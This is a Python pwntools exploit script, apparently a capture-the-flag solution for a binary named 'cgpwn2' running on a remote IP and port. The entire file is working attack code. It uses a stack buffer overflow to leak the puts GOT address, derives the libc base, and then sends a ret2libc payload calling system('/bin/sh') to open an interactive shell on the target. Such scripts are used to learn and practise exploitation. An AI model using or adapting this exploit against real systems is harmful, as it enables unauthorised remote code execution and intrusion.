
from pwn import *
from leak_to_address import *

context.terminal = ['gnome-terminal', '-e']

# r = process('./cgpwn2')
r = remote('111.198.29.45', 37934)

# https://libc.blukat.me/?q=puts%3A0xf7630140

libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')
# libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so')

binsh_off = next(libc.search(b'/bin/sh'))
system_off = libc.sym[b'system']

puts_plt = 0x08048410
puts_got = 0x0804A018

hello = 0x08048562

puts_off = libc.sym[b'puts']

r.recvuntil('name\n')
r.sendline(b'AAAA')
r.recvuntil('here:\n')

p = b'A' * 42
p += p32(puts_plt)
p += p32(hello)
p += p32(puts_got)

r.sendline(p)

s = r.readline()
l = Leak_address(s, 32)
print('Leak address : ', l.print_leak())

libc_addr = l.leak_to_32_int(0) - puts_off
binsh = libc_addr + binsh_off
system = libc_addr + system_off

log.info('Libc_addr     : ' + hex(libc_addr))
log.info('System_addr   : ' + hex(system))
log.info('Binsh_addr    : ' + hex(binsh))


r.recvuntil('name\n')
r.sendline(b'AAAA')
r.recvuntil('here:\n')

p = b'A' * 42
p += p32(system)
p += p32(0xAAAAAAAA)
p += p32(binsh)

r.sendline(p)

# gdb.attach(r)

r.interactive()
